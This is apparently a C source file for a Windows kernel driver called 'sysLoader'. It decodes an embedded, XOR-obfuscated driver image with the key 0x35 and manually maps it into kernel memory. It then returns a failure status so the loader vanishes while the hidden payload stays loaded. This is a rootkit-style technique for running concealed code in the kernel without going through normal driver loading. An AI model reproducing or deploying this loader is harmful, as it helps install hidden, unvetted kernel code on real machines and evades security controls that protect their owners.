
#include <ntifs.h>
#include "memoryLoader.h"
#include "pee.h"


VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("sysLoader:Enter DriverUnload\n");
}

#define MAGIC 0x35

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath)
{
	NTSTATUS status;
	DbgPrint("sysLoader:Enter DriverEntry\n");

	pDriverObject->DriverUnload = DriverUnload;

	// FILEBUFF: from pee.h
	PUCHAR pMemory =  ExAllocatePool(NonPagedPool, FILEBUFF_LENGTH);
	RtlCopyMemory(pMemory, FILEBUFF, FILEBUFF_LENGTH);

	// decode 
	for (size_t i = 0; i < FILEBUFF_LENGTH; i++)
	{
		pMemory[i] ^= MAGIC;
	}

	LoadDriver(pMemory);
	ExFreePool(pMemory);

	DbgPrint("sysLoader:DriverEntry end \n");
	return STATUS_UNSUCCESSFUL;
}